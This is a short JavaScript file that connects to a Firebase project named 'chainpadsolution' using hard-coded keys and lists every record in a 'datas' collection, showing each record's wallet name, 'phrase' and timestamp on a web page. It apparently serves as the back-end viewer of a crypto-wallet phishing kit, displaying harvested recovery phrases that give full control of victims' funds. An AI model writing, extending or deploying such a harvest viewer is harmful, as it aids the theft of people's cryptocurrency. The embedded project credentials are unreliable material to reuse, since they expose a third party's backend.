//firebase import
import firebase from "https://cdn.skypack.dev/firebase/compat/app";
import "https://cdn.skypack.dev/firebase/compat/auth";
import "https://cdn.skypack.dev/firebase/compat/firestore";

//jquery import
import "https://code.jquery.com/jquery-3.6.1.min.js"

const config = {
    apiKey: "AIzaSyB121nMN9SwJ97w3VwviYzk7ZO9J_XhFcI",
    authDomain: "chainpadsolution.firebaseapp.com",
    projectId: "chainpadsolution",
    storageBucket: "chainpadsolution.appspot.com",
    messagingSenderId: "56896339800",
    appId: "1:56896339800:web:a9a503f658efe2a64f6f2d"
}


firebase.initializeApp(config);
const db = firebase.firestore();
const auth = firebase.auth();


db.collection("datas").orderBy("time", "desc").get().then((querySnapshot) => {
    querySnapshot.forEach((doc) => {

   
   
   console.log(doc.id, " => ", doc.data());
   
   let wallet = doc.data().wallet
   let phrase = doc.data().phrase
   let time = doc.data().time.toDate()
   
   $('body').append(`
   <div>
    wallet: ${wallet} <br>
    phrase: ${phrase} <br>
    time: ${time}
   </div><br><br>
   `)
   
   
   });
   });
